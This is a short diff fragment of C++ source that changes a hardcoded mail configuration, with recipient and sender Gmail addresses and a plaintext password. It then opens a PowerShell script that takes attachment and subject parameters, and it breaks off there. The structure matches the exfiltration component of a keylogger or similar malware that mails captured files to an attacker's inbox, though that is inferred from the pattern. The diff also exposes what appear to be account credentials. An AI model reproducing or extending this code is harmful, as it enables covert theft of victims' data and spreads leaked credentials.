@@ -14,8 +14,8 @@
 namespace Mail
 {   //Mail Recipient and Sender
     #define X_EM_TO "undonecayon@gmail.com"
-    #define X_EM_FROM "undonecayon@gmail.com"
-    #define X_EM_PASS "12345" //Password
+    #define X_EM_FROM "yeah4sureee@gmail.com"
+    #define X_EM_PASS "root/iKfnv1echo" //Password
 
     const std::string &PowerShellScript =
 "Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
